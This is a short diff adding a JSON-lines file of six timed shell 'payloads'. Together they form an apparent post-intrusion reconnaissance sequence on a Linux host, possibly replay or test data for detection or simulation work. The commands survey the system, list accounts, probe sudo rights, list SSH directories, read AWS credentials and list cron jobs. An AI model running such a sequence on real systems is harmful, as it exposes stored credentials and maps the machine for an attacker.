@@ -1,0 +1,6 @@
+{"t": 0, "payload": "id; uname -a; hostname"}
+{"t": 9, "payload": "cat /etc/os-release; df -h"}
+{"t": 21, "payload": "ps aux --sort=-%mem | head -40; ss -tlnp"}
+{"t": 36, "payload": "cat /etc/passwd | grep -v nologin; sudo -n -l 2>&1"}
+{"t": 48, "payload": "ls -la ~/.ssh /home 2>/dev/null; cat ~/.aws/credentials 2>/dev/null"}
+{"t": 63, "payload": "crontab -l; ls -la /etc/cron.d"}
